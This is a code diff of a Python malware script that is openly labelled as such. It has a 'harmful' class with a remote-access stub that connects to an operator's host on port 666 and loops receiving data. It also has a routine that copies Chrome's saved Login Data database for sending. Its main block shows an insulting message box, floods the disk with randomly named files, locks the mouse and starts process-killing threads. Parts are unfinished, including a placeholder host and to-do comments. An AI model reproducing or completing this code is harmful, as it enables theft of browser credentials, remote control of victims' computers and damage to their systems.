@@ -1,5 +1,10 @@
 import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, socket
 
+client = socket.socket()
+host = "ur host ip go here"
+port = 666
+format = "utf-8"
+client.connect((host, port))
 
 class harmless:
     """Harmless modules"""
@@ -112,28 +117,24 @@ class malware:
         
 class harmful:
     def rat(self):
-        client = socket.socket()
-        host = "ur host ip go here"
-        port = 666
-        format = "utf-8"
-        client.connect((host,port))
-        
-        client.close()
+        while 1:
+            data = client.recv(1024)
     
     def dump(self):
         """Dumps databases and thing prepared for sending"""
-        # FIX LATER 
+        # WORK ON LATER 
         print(os.path.isdir("C:\Program Files\Google\Chrome\Application"))
         print(os.path.isdir(os.path.expanduser('~') + "\AppData\Local\Discord"))
         login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
         shutil.copy2(login_db, "Loginvault.db")
 
+client.close()
 
 if __name__ == "__main__":
     ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1)
     
     for i in range(random.randint(25, 200)):
-        open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 256)))}.txt", "a").write("LOL WHY DID U RUN THIS????")
+        open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 250)))}.txt", "a").write("LOL WHY DID U RUN THIS????")
     
     #FIX LATER THIS SO ANNOYING!!!!!!
     try:
@@ -149,7 +150,7 @@ if __name__ == "__main__":
     popup_thread = threading.Thread(target=harmless.pop_up).start()
     openurl_thread = threading.Thread(target=harmless.open_url).start()
     change_wallpaper = threading.Thread(target=harmless.change_wallpaper).start()
-    mouse_locker = threading.Thread(target=harmless.mouse_locker).start()
+    mouse_locker = threading.Thread(target=harmless.mouse_lock).start()
     kill_thread = threading.Thread(target=malware.kill).start()
     random_kill_thread = threading.Thread(target=malware.random_kill).start()
     create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
